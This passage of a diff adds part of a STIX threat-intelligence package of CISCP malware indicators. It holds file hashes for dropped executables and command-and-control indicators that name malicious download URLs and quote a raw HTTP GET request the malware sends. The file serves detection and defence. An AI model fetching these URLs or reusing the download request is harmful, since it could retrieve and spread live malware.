+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">384:ddyTStdZrow/VlZbn+RHM13vfdHldhwLGEGC+OGa0X:dYGtdtFR6M13vfdHldhwyEr+OGa0X</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2014-05-23T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-d931ed23-d23e-4c56-872d-4b50d075ffaf" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>This data file was written to the system by "updGA.exe"</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-3a97c764-cc0a-49bc-92f1-9ebdac6b190e">
+        <cybox:Object id="CISCP:Object-2c9f51f0-7dca-4df9-813d-4a0c74877ae7">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">seomat.exe</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">4096</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">d285e11dd8c4326390bae91de0b71156</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">ed32e878d93b0a326dd3b3b6ea0631b52faf2d75</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">96:DadpWl6MlOrGKiv/0AsPdpA9A8AjAaABAQAnADSAQq:DadpWl6D2vaUONMbixAvV</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2014-05-23T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-dcf0c649-3963-4c6c-9379-ef1cca800c4b" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>The malware connects to "albus-capital.com" using HTTTP over TCP port 80 to obtain the file, "777_2305USmp_1.zip" 
+
+Below is the GET request:
+
+GET /images/howto/777_2305USmp_1.zip HTTP/1.1
+Accept: text/*, application/*
+User-Agent: Opera10
+Host: albus-capital.com
+Cache-Control: no-cache</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-504775ff-450b-42bb-acc5-940b4c4be8f7">
+        <cybox:Object id="CISCP:Object-2a1f9867-a65f-4efd-8f6c-dc1dcfd8c0ca">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://albus-capital.com/images/howto/777_2305USmp_1.zip</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2014-05-23T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-b4d8b062-94d8-46ca-8529-6d221926eb9d" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>The malware connects to "auracinematics.com" using HTTTP to obtain the file, "b02.exe"</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-82db01e3-46cf-420f-a520-b5399e23f0ec">
+        <cybox:Object id="CISCP:Object-17bca2e3-0de3-4c37-8bf4-955cf05b118b">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://auracinematics.com/acc/b02.exe</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2014-05-23T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+  </stix:Indicators>
+  <stix:TTPs>
+    <stix:Kill_Chains>
+      <stixCommon:Kill_Chain definer="LMCO" id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="LM Cyber Kill Chain" number_of_phases="7" reference="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf">
+        <stixCommon:Kill_Chain_Phase name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/>
+        <stixCommon:Kill_Chain_Phase name="Weaponization" ordinality="2" phase_id="stix:KillChainPhase-445b4827-3cca-42bd-8421-f2e947133c16"/>
+        <stixCommon:Kill_Chain_Phase name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+        <stixCommon:Kill_Chain_Phase name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/>
+        <stixCommon:Kill_Chain_Phase name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+        <stixCommon:Kill_Chain_Phase name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+        <stixCommon:Kill_Chain_Phase name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/>
+      </stixCommon:Kill_Chain>
+    </stix:Kill_Chains>
+  </stix:TTPs>
+</stix:STIX_Package>
